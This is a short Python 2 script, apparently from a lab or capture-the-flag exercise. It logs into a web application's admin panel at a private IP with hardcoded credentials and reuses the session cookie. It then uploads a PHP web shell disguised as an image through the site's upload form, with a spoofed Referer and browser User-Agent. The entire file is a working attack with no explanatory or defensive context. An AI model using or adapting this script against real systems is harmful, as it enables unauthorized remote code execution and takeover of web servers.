# Script from password retrieval (I guess) to shell
import urllib2
import urllib
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

register_openers()

data = urllib.urlencode({'user':'admin','password':'P4ssw0rd'})
url = 'http://192.168.88.193/admin/login.php'

request = urllib2.Request(url,data)
result = urllib2.urlopen(request)
#print result.getHeader('Set-Cookie')
cookie = result.info()['Set-Cookie']

# Now upload shell.php3 using $cookie
url = 'http://192.168.88.193/admin/index.php'

with open("shell.php3",'r') as f:
	data, headers = multipart_encode({"image":f,'title':'afile','category':'1','Add':'Add'})
	request = urllib2.Request(url, data, headers)
	cookie = cookie[:cookie.index(';')]
	request.add_header("Cookie", cookie)
	request.add_header("Referer", "http://192.168.88.193/admin/new.php")
	request.add_header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.22 Safari/537.36")

	print cookie
	print urllib2.urlopen(request).read()

